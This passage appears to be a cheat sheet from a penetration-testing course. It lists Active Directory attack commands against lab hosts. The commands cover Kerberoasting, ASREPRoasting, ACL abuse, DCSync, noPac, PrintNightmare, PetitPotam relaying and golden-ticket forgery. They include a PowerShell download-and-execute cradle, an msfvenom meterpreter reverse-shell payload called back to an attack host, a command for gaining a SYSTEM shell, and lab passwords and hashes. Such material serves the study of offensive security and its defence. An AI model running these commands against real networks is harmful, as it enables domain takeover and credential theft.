|`python3 windapsearch.py --dc-ip 172.16.5.5 -u inlanefreight\wley -p transporter@4 -PU`|Used to perform a recursive search (`-PU`) for users with nested permissions using valid credentials. Performed from a Linux-based host.|
|`sudo bloodhound-python -u 'forend' -p 'Klmcargo2' -ns 172.16.5.5 -d inlanefreight.local -c all`|Executes the python implementation of BloodHound (`bloodhound.py`) with valid credentials and specifies a name server (`-ns`) and target Windows domain (`inlanefreight.local`) as well as runs all checks (`-c all`). Runs using valid credentials. Performed from a Linux-based host.|

### Enumeration by Living Off the Land

|Command|Description|
|---|---|
|`Get-Module`|PowerShell cmd-let used to list all available modules, their version and command options from a Windows-based host.|
|`Import-Module ActiveDirectory`|Loads the `Active Directory` PowerShell module from a Windows-based host.|
|`Get-ADDomain`|PowerShell cmd-let used to gather Windows domain information from a Windows-based host.|
|`Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName`|PowerShell cmd-let used to enumerate user accounts on a target Windows domain and filter by `ServicePrincipalName`. Performed from a Windows-based host.|
|`Get-ADTrust -Filter *`|PowerShell cmd-let used to enumerate any trust relationships in a target Windows domain and filters by any (`-Filter *`). Performed from a Windows-based host.|
|`Get-ADGroup -Filter * \| select name`|PowerShell cmd-let used to enumerate groups in a target Windows domain and filters by the name of the group (`select name`). Performed from a Windows-based host.|
|`Get-ADGroup -Identity "Backup Operators"`|PowerShell cmd-let used to search for a specifc group (`-Identity "Backup Operators"`). Performed from a Windows-based host.|
|`Get-ADGroupMember -Identity "Backup Operators"`|PowerShell cmd-let used to discover the members of a specific group (`-Identity "Backup Operators"`). Performed from a Windows-based host.|
|`Export-PowerViewCSV`|PowerView script used to append results to a `CSV` file. Performed from a Windows-based host.|
|`ConvertTo-SID`|PowerView script used to convert a `User` or `Group` name to it's `SID`. Performed from a Windows-based host.|
|`Get-DomainSPNTicket`|PowerView script used to request the kerberos ticket for a specified service principal name (`SPN`). Performed from a Windows-based host.|
|`Get-Domain`|PowerView script used tol return the AD object for the current (or specified) domain. Performed from a Windows-based host.|
|`Get-DomainController`|PowerView script used to return a list of the target domain controllers for the specified target domain. Performed from a Windows-based host.|
|`Get-DomainUser`|PowerView script used to return all users or specific user objects in AD. Performed from a Windows-based host.|
|`Get-DomainComputer`|PowerView script used to return all computers or specific computer objects in AD. Performed from a Windows-based host.|
|`Get-DomainGroup`|PowerView script used to eturn all groups or specific group objects in AD. Performed from a Windows-based host.|
|`Get-DomainOU`|PowerView script used to search for all or specific OU objects in AD. Performed from a Windows-based host.|
|`Find-InterestingDomainAcl`|PowerView script used to find object `ACLs` in the domain with modification rights set to non-built in objects. Performed from a Windows-based host.|
|`Get-DomainGroupMember`|PowerView script used to return the members of a specific domain group. Performed from a Windows-based host.|
|`Get-DomainFileServer`|PowerView script used to return a list of servers likely functioning as file servers. Performed from a Windows-based host.|
|`Get-DomainDFSShare`|PowerView script used to return a list of all distributed file systems for the current (or specified) domain. Performed from a Windows-based host.|
|`Get-DomainGPO`|PowerView script used to return all GPOs or specific GPO objects in AD. Performed from a Windows-based host.|
|`Get-DomainPolicy`|PowerView script used to return the default domain policy or the domain controller policy for the current domain. Performed from a Windows-based host.|
|`Get-NetLocalGroup`|PowerView script used to enumerate local groups on a local or remote machine. Performed from a Windows-based host.|
|`Get-NetLocalGroupMember`|PowerView script enumerate members of a specific local group. Performed from a Windows-based host.|
|`Get-NetShare`|PowerView script used to return a list of open shares on a local (or a remote) machine. Performed from a Windows-based host.|
|`Get-NetSession`|PowerView script used to return session information for the local (or a remote) machine. Performed from a Windows-based host.|
|`Test-AdminAccess`|PowerView script used to test if the current user has administrative access to the local (or a remote) machine. Performed from a Windows-based host.|
|`Find-DomainUserLocation`|PowerView script used to find machines where specific users are logged into. Performed from a Windows-based host.|
|`Find-DomainShare`|PowerView script used to find reachable shares on domain machines. Performed from a Windows-based host.|
|`Find-InterestingDomainShareFile`|PowerView script that searches for files matching specific criteria on readable shares in the domain. Performed from a Windows-based host.|
|`Find-LocalAdminAccess`|PowerView script used to find machines on the local domain where the current user has local administrator access Performed from a Windows-based host.|
|`Get-DomainTrust`|PowerView script that returns domain trusts for the current domain or a specified domain. Performed from a Windows-based host.|
|`Get-ForestTrust`|PowerView script that returns all forest trusts for the current forest or a specified forest. Performed from a Windows-based host.|
|`Get-DomainForeignUser`|PowerView script that enumerates users who are in groups outside of the user's domain. Performed from a Windows-based host.|
|`Get-DomainForeignGroupMember`|PowerView script that enumerates groups with users outside of the group's domain and returns each foreign member. Performed from a Windows-based host.|
|`Get-DomainTrustMapping`|PowerView script that enumerates all trusts for current domain and any others seen. Performed from a Windows-based host.|
|`Get-DomainGroupMember -Identity "Domain Admins" -Recurse`|PowerView script used to list all the members of a target group (`"Domain Admins"`) through the use of the recurse option (`-Recurse`). Performed from a Windows-based host.|
|`Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName`|PowerView script used to find users on the target Windows domain that have the `Service Principal Name` set. Performed from a Windows-based host.|
|`.\Snaffler.exe -d INLANEFREIGHT.LOCAL -s -v data`|Runs a tool called `Snaffler` against a target Windows domain that finds various kinds of data in shares that the compromised account has access to. Performed from a Windows-based host.|

### Transfering Files

|Command|Description|
|---|---|
|`sudo python3 -m http.server 8001`|Starts a python web server for quick hosting of files. Performed from a Linux-basd host.|
|`"IEX(New-Object Net.WebClient).downloadString('http://172.16.5.222/SharpHound.exe')"`|PowerShell one-liner used to download a file from a web server. Performed from a Windows-based host.|
|`impacket-smbserver -ip 172.16.5.x -smb2support -username user -password password shared /home/administrator/Downloads/`|Starts a impacket `SMB` server for quick hosting of a file. Performed from a Windows-based host.|

### Kerberoasting

|Command|Description|
|---|---|
|`sudo python3 -m pip install .`|Used to install Impacket from inside the directory that gets cloned to the attack host. Performed from a Linux-based host.|
|`GetUserSPNs.py -h`|Impacket tool used to display the options and functionality of `GetUserSPNs.py` from a Linux-based host.|
|`GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/mholliday`|Impacket tool used to get a list of `SPNs` on the target Windows domain from a Linux-based host.|
|`GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/mholliday -request`|Impacket tool used to download/request (`-request`) all TGS tickets for offline processing from a Linux-based host.|
|`GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/mholliday -request-user sqldev`|Impacket tool used to download/request (`-request-user`) a TGS ticket for a specific user account (`sqldev`) from a Linux-based host.|
|`GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/mholliday -request-user sqldev -outputfile sqldev_tgs`|Impacket tool used to download/request a TGS ticket for a specific user account and write the ticket to a file (`-outputfile sqldev_tgs`) linux-based host.|
|`hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt --force`|Attempts to crack the Kerberos (`-m 13100`) ticket hash (`sqldev_tgs`) using `hashcat` and a wordlist (`rockyou.txt`) from a Linux-based host.|
|`setspn.exe -Q */*`|Used to enumerate `SPNs` in a target Windows domain from a Windows-based host.|
|`Add-Type -AssemblyName System.IdentityModel New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"`|PowerShell script used to download/request the TGS ticket of a specific user from a Windows-based host.|
|`setspn.exe -T INLANEFREIGHT.LOCAL -Q */* \| Select-String '^CN' -Context 0,1 \| % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }`|Used to download/request all TGS tickets from a WIndows-based host.|
|`mimikatz # base64 /out:true`|`Mimikatz` command that ensures TGS tickets are extracted in `base64` format from a Windows-based host.|
|`kerberos::list /export`|`Mimikatz` command used to extract the TGS tickets from a Windows-based host.|
|`echo "<base64 blob>" \| tr -d \\n`|Used to prepare the base64 formatted TGS ticket for cracking from Linux-based host.|
|`cat encoded_file \| base64 -d > sqldev.kirbi`|Used to output a file (`encoded_file`) into a .kirbi file in base64 (`base64 -d > sqldev.kirbi`) format from a Linux-based host.|
|`python2.7 kirbi2john.py sqldev.kirbi`|Used to extract the `Kerberos ticket`. This also creates a file called `crack_file` from a Linux-based host.|
|`sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat`|Used to modify the `crack_file` for `Hashcat` from a Linux-based host.|
|`cat sqldev_tgs_hashcat`|Used to view the prepared hash from a Linux-based host.|
|`hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt`|Used to crack the prepared Kerberos ticket hash (`sqldev_tgs_hashcat`) using a wordlist (`rockyou.txt`) from a Linux-based host.|
|`Import-Module .\PowerView.ps1 Get-DomainUser * -spn \| select samaccountname`|Uses PowerView tool to extract `TGS Tickets` . Performed from a Windows-based host.|
|`Get-DomainUser -Identity sqldev \| Get-DomainSPNTicket -Format Hashcat`|PowerView tool used to download/request the TGS ticket of a specific ticket and automatically format it for `Hashcat` from a Windows-based host.|
|`Get-DomainUser * -SPN \| Get-DomainSPNTicket -Format Hashcat \| Export-Csv .\ilfreight_tgs.csv -NoTypeInformation`|Exports all TGS tickets to a `.CSV` file (`ilfreight_tgs.csv`) from a Windows-based host.|
|`cat .\ilfreight_tgs.csv`|Used to view the contents of the .csv file from a Windows-based host.|
|`.\Rubeus.exe`|Used to view the options and functionality possible with the tool `Rubeus`. Performed from a Windows-based host.|
|`.\Rubeus.exe kerberoast /stats`|Used to check the kerberoast stats (`/stats`) within the target Windows domain from a Windows-based host.|
|`.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap`|Used to request/download TGS tickets for accounts with the `admin` count set to `1` then formats the output in an easy to view & crack manner (`/nowrap`) . Performed from a Windows-based host.|
|`.\Rubeus.exe kerberoast /user:testspn /nowrap`|Used to request/download a TGS ticket for a specific user (`/user:testspn`) the formats the output in an easy to view & crack manner (`/nowrap`). Performed from a Windows-based host.|
|`Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes`|PowerView tool used to check the `msDS-SupportedEncryptionType` attribute associated with a specific user account (`testspn`). Performed from a Windows-based host.|
|`hashcat -m 13100 rc4_to_crack /usr/share/wordlists/rockyou.txt`|Used to attempt to crack the ticket hash using a wordlist (`rockyou.txt`) from a Linux-based host .|

### ACL Enumeration & Tactics

|Command|Description|
|---|---|
|`Find-InterestingDomainAcl`|PowerView tool used to find object ACLs in the target Windows domain with modification rights set to non-built in objects from a Windows-based host.|
|`Import-Module .\PowerView.ps1 $sid = Convert-NameToSid wley`|Used to import PowerView and retrieve the `SID` of a specific user account (`wley`) from a Windows-based host.|
|`Get-DomainObjectACL -Identity * \| ? {$_.SecurityIdentifier -eq $sid}`|Used to find all Windows domain objects that the user has rights over by mapping the user's `SID` to the `SecurityIdentifier` property from a Windows-based host.|
|`$guid= "00299570-246d-11d0-a768-00aa006e0529" Get-ADObject -SearchBase "CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)" -Filter {ObjectClass -like 'ControlAccessRight'} -Properties * \| Select Name,DisplayName,DistinguishedName,rightsGuid \| ?{$_.rightsGuid -eq $guid} \| fl`|Used to perform a reverse search & map to a `GUID` value from a Windows-based host.|
|`Get-DomainObjectACL -ResolveGUIDs -Identity * \| ? {$_.SecurityIdentifier -eq $sid}`|Used to discover a domain object's ACL by performing a search based on GUID's (`-ResolveGUIDs`) from a Windows-based host.|
|`Get-ADUser -Filter * \| Select-Object -ExpandProperty SamAccountName > ad_users.txt`|Used to discover a group of user accounts in a target Windows domain and add the output to a text file (`ad_users.txt`) from a Windows-based host.|
|`foreach($line in [System.IO.File]::ReadLines("C:\Users\htb-student\Desktop\ad_users.txt")) {get-acl "AD:\$(Get-ADUser $line)" \| Select-Object Path -ExpandProperty Access \| Where-Object {$_.IdentityReference -match 'INLANEFREIGHT\\wley'}}`|A `foreach loop` used to retrieve ACL information for each domain user in a target Windows domain by feeding each list of a text file(`ad_users.txt`) to the `Get-ADUser` cmdlet, then enumerates access rights of those users. Performed from a Windows-based host.|
|`$SecPassword = ConvertTo-SecureString '<PASSWORD HERE>' -AsPlainText -Force $Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword)`|Used to create a `PSCredential Object` from a Windows-based host.|
|`$damundsenPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force`|Used to create a `SecureString Object` from a Windows-based host.|
|`Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose`|PowerView tool used to change the password of a specifc user (`damundsen`) on a target Windows domain from a Windows-based host.|
|`Get-ADGroup -Identity "Help Desk Level 1" -Properties * \| Select -ExpandProperty Members`|PowerView tool used view the members of a target security group (`Help Desk Level 1`) from a Windows-based host.|
|`Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose`|PowerView tool used to add a specifc user (`damundsen`) to a specific security group (`Help Desk Level 1`) in a target Windows domain from a Windows-based host.|
|`Get-DomainGroupMember -Identity "Help Desk Level 1" \| Select MemberName`|PowerView tool used to view the members of a specific security group (`Help Desk Level 1`) and output only the username of each member (`Select MemberName`) of the group from a Windows-based host.|
|`Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose`|PowerView tool used create a fake `Service Principal Name` given a sepecift user (`adunn`) from a Windows-based host.|
|`Set-DomainObject -Credential $Cred2 -Identity adunn -Clear serviceprincipalname -Verbose`|PowerView tool used to remove the fake `Service Principal Name` created during the attack from a Windows-based host.|
|`Remove-DomainGroupMember -Identity "Help Desk Level 1" -Members 'damundsen' -Credential $Cred2 -Verbose`|PowerView tool used to remove a specific user (`damundsent`) from a specific security group (`Help Desk Level 1`) from a Windows-based host.|
|`ConvertFrom-SddlString`|PowerShell cmd-let used to covert an `SDDL string` into a readable format. Performed from a Windows-based host.|

### DCSync

|Command|Description|
|---|---|
|`Get-DomainUser -Identity adunn \| select samaccountname,objectsid,memberof,useraccountcontrol \|fl`|PowerView tool used to view the group membership of a specific user (`adunn`) in a target Windows domain. Performed from a Windows-based host.|
|`$sid= "S-1-5-21-3842939050-3880317879-2865463114-1164" Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs \| ? { ($_.ObjectAceType -match 'Replication-Get')} \| ?{$_.SecurityIdentifier -match $sid} \| select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType \| fl`|Used to create a variable called SID that is set equal to the SID of a user account. Then uses PowerView tool `Get-ObjectAcl` to check a specific user's replication rights. Performed from a Windows-based host.|
|`secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5 -use-vss`|Impacket tool sed to extract NTLM hashes from the NTDS.dit file hosted on a target Domain Controller (`172.16.5.5`) and save the extracted hashes to an file (`inlanefreight_hashes`). Performed from a Linux-based host.|
|`mimikatz # lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator`|Uses `Mimikatz` to perform a `dcsync` attack from a Windows-based host.|

### Privileged Access

|Command|Description|
|---|---|
|`Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Desktop Users"`|PowerView based tool to used to enumerate the `Remote Desktop Users` group on a Windows target (`-ComputerName ACADEMY-EA-MS01`) from a Windows-based host.|
|`Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Management Users"`|PowerView based tool to used to enumerate the `Remote Management Users` group on a Windows target (`-ComputerName ACADEMY-EA-MS01`) from a Windows-based host.|
|`$password = ConvertTo-SecureString "Klmcargo2" -AsPlainText -Force`|Creates a variable (`$password`) set equal to the password (`Klmcargo2`) of a user from a Windows-based host.|
|`$cred = new-object System.Management.Automation.PSCredential ("INLANEFREIGHT\forend", $password)`|Creates a variable (`$cred`) set equal to the username (`forend`) and password (`$password`) of a target domain account from a Windows-based host.|
|`Enter-PSSession -ComputerName ACADEMY-EA-DB01 -Credential $cred`|Uses the PowerShell cmd-let `Enter-PSSession` to establish a PowerShell session with a target over the network (`-ComputerName ACADEMY-EA-DB01`) from a Windows-based host. Authenticates using credentials made in the 2 commands shown prior (`$cred` & `$password`).|
|`evil-winrm -i 10.129.201.234 -u forend`|Used to establish a PowerShell session with a Windows target from a Linux-based host using `WinRM`.|
|`Import-Module .\PowerUpSQL.ps1`|Used to import the `PowerUpSQL` tool.|
|`Get-SQLInstanceDomain`|PowerUpSQL tool used to enumerate SQL server instances from a Windows-based host.|
|`Get-SQLQuery -Verbose -Instance "172.16.5.150,1433" -username "inlanefreight\damundsen" -password "SQL1234!" -query 'Select @@version'`|PowerUpSQL tool used to connect to connect to a SQL server and query the version (`-query 'Select @@version'`) from a Windows-based host.|
|`mssqlclient.py`|Impacket tool used to display the functionality and options provided with `mssqlclient.py` from a Linux-based host.|
|`mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth`|Impacket tool used to connect to a MSSQL server from a Linux-based host.|
|`SQL> help`|Used to display mssqlclient.py options once connected to a MSSQL server.|
|`SQL> enable_xp_cmdshell`|Used to enable `xp_cmdshell stored procedure` that allows for executing OS commands via the database from a Linux-based host.|
|`xp_cmdshell whoami /priv`|Used to enumerate rights on a system using `xp_cmdshell`.|

### NoPac

|Command|Description|
|---|---|
|`sudo git clone https://github.com/Ridter/noPac.git`|Used to clone a `noPac` exploit using git. Performed from a Linux-based host.|
|`sudo python3 scanner.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap`|Runs `scanner.py` to check if a target system is vulnerable to `noPac`/`Sam_The_Admin` from a Linux-based host.|
|`sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5 -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap`|Used to exploit the `noPac`/`Sam_The_Admin` vulnerability and gain a SYSTEM shell (`-shell`). Performed from a Linux-based host.|
|`sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5 -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc-user INLANEFREIGHT/administrator`|Used to exploit the `noPac`/`Sam_The_Admin` vulnerability and perform a `DCSync` attack against the built-in Administrator account on a Domain Controller from a Linux-based host.|

### PrintNightmare

|Command|Description|
|---|---|
|`git clone https://github.com/cube0x0/CVE-2021-1675.git`|Used to clone a PrintNightmare exploit using git from a Linux-based host.|
|`pip3 uninstall impacket git clone https://github.com/cube0x0/impacket cd impacket python3 ./setup.py install`|Used to ensure the exploit author's (`cube0x0`) version of Impacket is installed. This also uninstalls any previous Impacket version on a Linux-based host.|
|`rpcdump.py @172.16.5.5 \| egrep 'MS-RPRN\|MS-PAR'`|Used to check if a Windows target has `MS-PAR` & `MSRPRN` exposed from a Linux-based host.|
|`msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.129.202.111 LPORT=8080 -f dll > backupscript.dll`|Used to generate a DLL payload to be used by the exploit to gain a shell session. Performed from a Windows-based host.|
|`sudo smbserver.py -smb2support CompData /path/to/backupscript.dll`|Used to create an SMB server and host a shared folder (`CompData`) at the specified location on the local linux host. This can be used to host the DLL payload that the exploit will attempt to download to the host. Performed from a Linux-based host.|
|`sudo python3 CVE-2021-1675.py inlanefreight.local/<username>:<password>@172.16.5.5 '\\10.129.202.111\CompData\backupscript.dll'`|Executes the exploit and specifies the location of the DLL payload. Performed from a Linux-based host.|

### PetitPotam

|Command|Description|
|---|---|
|`sudo ntlmrelayx.py -debug -smb2support --target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp --adcs --template DomainController`|Impacket tool used to create an `NTLM relay` by specifiying the web enrollment URL for the `Certificate Authority` host. Perfomred from a Linux-based host.|
|`git clone https://github.com/topotam/PetitPotam.git`|Used to clone the `PetitPotam` exploit using git. Performed from a Linux-based host.|
|`python3 PetitPotam.py 172.16.5.225 172.16.5.5`|Used to execute the PetitPotam exploit by specifying the IP address of the attack host (`172.16.5.255`) and the target Domain Controller (`172.16.5.5`). Performed from a Linux-based host.|
|`python3 /opt/PKINITtools/gettgtpkinit.py INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01\$ -pfx-base64 <base64 certificate> = dc01.ccache`|Uses `gettgtpkinit`.py to request a TGT ticket for the Domain Controller (`dc01.ccache`) from a Linux-based host.|
|`secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass "ACADEMY-EA-DC01$"@ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL`|Impacket tool used to perform a DCSync attack and retrieve one or all of the `NTLM password hashes` from the target Windows domain. Performed from a Linux-based host.|
|`klist`|`krb5-user` command used to view the contents of the `ccache` file. Performed from a Linux-based host.|
|`python /opt/PKINITtools/getnthash.py -key 70f805f9c91ca91836b670447facb099b4b2b7cd5b762386b3369aa16d912275 INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01$`|Used to submit TGS requests using `getnthash.py` from a Linux-based host.|
|`secretsdump.py -just-dc-user INLANEFREIGHT/administrator "ACADEMY-EA-DC01$"@172.16.5.5 -hashes aad3c435b514a4eeaad3b935b51304fe:313b6f423cd1ee07e91315b4919fb4ba`|Impacket tool used to extract hashes from `NTDS.dit` using a `DCSync attack` and a captured hash (`-hashes`). Performed from a Linux-based host.|
|`.\Rubeus.exe asktgt /user:ACADEMY-EA-DC01$ /<base64 certificate>=/ptt`|Uses Rubeus to request a TGT and perform a `pass-the-ticket attack` using the machine account (`/user:ACADEMY-EA-DC01$`) of a Windows target. Performed from a Windows-based host.|
|`mimikatz # lsadump::dcsync /user:inlanefreight\krbtgt`|Performs a DCSync attack using `Mimikatz`. Performed from a Windows-based host.|

### Miscellaneous Misconfigurations

|Command|Description|
|---|---|
|`Import-Module .\SecurityAssessment.ps1`|Used to import the module `Security Assessment.ps1`. Performed from a Windows-based host.|
|`Get-SpoolStatus -ComputerName ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL`|SecurityAssessment.ps1 based tool used to enumerate a Windows target for `MS-PRN Printer bug`. Performed from a Windows-based host.|
|`adidnsdump -u inlanefreight\\forend ldap://172.16.5.5`|Used to resolve all records in a DNS zone over `LDAP` from a Linux-based host.|
|`adidnsdump -u inlanefreight\\forend ldap://172.16.5.5 -r`|Used to resolve unknown records in a DNS zone by performing an `A query` (`-r`) from a Linux-based host.|
|`Get-DomainUser * \| Select-Object samaccountname,description`|PowerView tool used to display the description field of select objects (`Select-Object`) on a target Windows domain from a Windows-based host.|
|`Get-DomainUser -UACFilter PASSWD_NOTREQD \| Select-Object samaccountname,useraccountcontrol`|PowerView tool used to check for the `PASSWD_NOTREQD` setting of select objects (`Select-Object`) on a target Windows domain from a Windows-based host.|
|`ls \\academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\scripts`|Used to list the contents of a share hosted on a Windows target from the context of a currently logged on user. Performed from a Windows-based host.|

### Group Policy Enumeration & Attacks

|Command|Description|
|---|---|
|`gpp-decrypt VPe/o9YRyz2cksnYRbNeQj35w9KxQ5ttbvtRaAVqxaE`|Tool used to decrypt a captured `group policy preference password` from a Linux-based host.|
|`crackmapexec smb -L \| grep gpp`|Locates and retrieves a `group policy preference password` using `CrackMapExec`, the filters the output using `grep`. Peformed from a Linux-based host.|
|`crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_autologin`|Locates and retrieves any credentials stored in the `SYSVOL` share of a Windows target using `CrackMapExec` from a Linux-based host.|
|`Get-DomainGPO \| select displayname`|PowerView tool used to enumerate GPO names in a target Windows domain from a Windows-based host.|
|`Get-GPO -All \| Select DisplayName`|PowerShell cmd-let used to enumerate GPO names. Performed from a Windows-based host.|
|`$sid=Convert-NameToSid "Domain Users"`|Creates a variable called `$sid` that is set equal to the `Convert-NameToSid` tool and specifies the group account `Domain Users`. Performed from a Windows-based host.|
|`Get-DomainGPO \| Get-ObjectAcl \| ?{$_.SecurityIdentifier -eq $sid`|PowerView tool that is used to check if the `Domain Users` (`eq $sid`) group has any rights over one or more GPOs. Performed from a Windows-based host.|
|`Get-GPO -Guid 7CA9C789-14CE-46E3-A722-83F4097AF532`|PowerShell cmd-let used to display the name of a GPO given a `GUID`. Performed from a Windows-based host.|

### ASREPRoasting

|Command|Description|
|---|---|
|`Get-DomainUser -PreauthNotRequired \| select samaccountname,userprincipalname,useraccountcontrol \| fl`|PowerView based tool used to search for the `DONT_REQ_PREAUTH` value across in user accounts in a target Windows domain. Performed from a Windows-based host.|
|`.\Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat`|Uses `Rubeus` to perform an `ASEP Roasting attack` and formats the output for `Hashcat`. Performed from a Windows-based host.|
|`hashcat -m 18200 ilfreight_asrep /usr/share/wordlists/rockyou.txt`|Uses `Hashcat` to attempt to crack the captured hash using a wordlist (`rockyou.txt`). Performed from a Linux-based host.|
|`kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt`|Enumerates users in a target Windows domain and automatically retrieves the `AS` for any users found that don't require Kerberos pre-authentication. Performed from a Linux-based host.|

### Trust Relationships - Child > Parent Trusts

|Command|Description|
|---|---|
|`Import-Module activedirectory`|Used to import the `Active Directory` module. Performed from a Windows-based host.|
|`Get-ADTrust -Filter *`|PowerShell cmd-let used to enumerate a target Windows domain's trust relationships. Performed from a Windows-based host.|
|`Get-DomainTrust`|PowerView tool used to enumerate a target Windows domain's trust relationships. Performed from a Windows-based host.|
|`Get-DomainTrustMapping`|PowerView tool used to perform a domain trust mapping from a Windows-based host.|
|`Get-DomainUser -Domain LOGISTICS.INLANEFREIGHT.LOCAL \| select SamAccountName`|PowerView tools used to enumerate users in a target child domain from a Windows-based host.|
|`mimikatz # lsadump::dcsync /user:LOGISTICS\krbtgt`|Uses Mimikatz to obtain the `KRBTGT` account's `NT Hash` from a Windows-based host.|
|`Get-DomainSID`|PowerView tool used to get the SID for a target child domain from a Windows-based host.|
|`Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" \| select distinguishedname,objectsid`|PowerView tool used to obtain the `Enterprise Admins` group's SID from a Windows-based host.|
|`ls \\academy-ea-dc01.inlanefreight.local\c$`|Used to attempt to list the contents of the C drive on a target Domain Controller. Performed from a Windows-based host.|
|`mimikatz # kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt`|Uses `Mimikatz` to create a `Golden Ticket` from a Windows-based host .|
|`.\Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /user:hacker /ptt`|Uses `Rubeus` to create a `Golden Ticket` from a Windows-based host.|
|`mimikatz # lsadump::dcsync /user:INLANEFREIGHT\lab_adm`|Uses `Mimikatz` to perform a DCSync attack from a Windows-based host.|
|`secretsdump.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 -just-dc-user LOGISTICS/krbtgt`|Impacket tool used to perform a DCSync attack from a Linux-based host.|
|`lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240`|Impacket tool used to perform a `SID Brute forcing` attack from a Linux-based host.|
|`lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 \| grep "Domain SID"`|Impacket tool used to retrieve the SID of a target Windows domain from a Linux-based host.|
|`lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.5 \| grep -B12 "Enterprise Admins"`|Impacket tool used to retrieve the `SID` of a target Windows domain and attach it to the Enterprise Admin group's `RID` from a Linux-based host.|
|`ticketer.py -nthash 9d765b482771505cbe97411065964d5f -domain LOGISTICS.INLANEFREIGHT.LOCAL -domain-sid S-1-5-21-2806153819-209893948-922872689 -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 hacker`|Impacket tool used to create a `Golden Ticket` from a Linux-based host.|
|`export KRB5CCNAME=hacker.ccache`|Used to set the `KRB5CCNAME Environment Variable` from a Linux-based host.|
|`psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5`|Impacket tool used to establish a shell session with a target Domain Controller from a Linux-based host.|
|`raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm`|Impacket tool that automatically performs an attack that escalates from child to parent domain.|

### Trust Relationships - Cross-Forest

|Command|Description|
|---|---|
|`Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL \| select SamAccountName`|PowerView tool used to enumerate accounts for associated `SPNs` from a Windows-based host.|
|`Get-DomainUser -Domain FREIGHTLOGISTICS.LOCAL -Identity mssqlsvc \| select samaccountname,memberof`|PowerView tool used to enumerate the `mssqlsvc` account from a Windows-based host.|
|`.\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap`|Uses `Rubeus` to perform a Kerberoasting Attack against a target Windows domain (`/domain:FREIGHTLOGISTICS.local`) from a Windows-based host.|
|`Get-DomainForeignGroupMember -Domain FREIGHTLOGISTICS.LOCAL`|PowerView tool used to enumerate groups with users that do not belong to the domain from a Windows-based host.|
|`Enter-PSSession -ComputerName ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -Credential INLANEFREIGHT\administrator`|PowerShell cmd-let used to remotely connect to a target Windows system from a Windows-based host.|
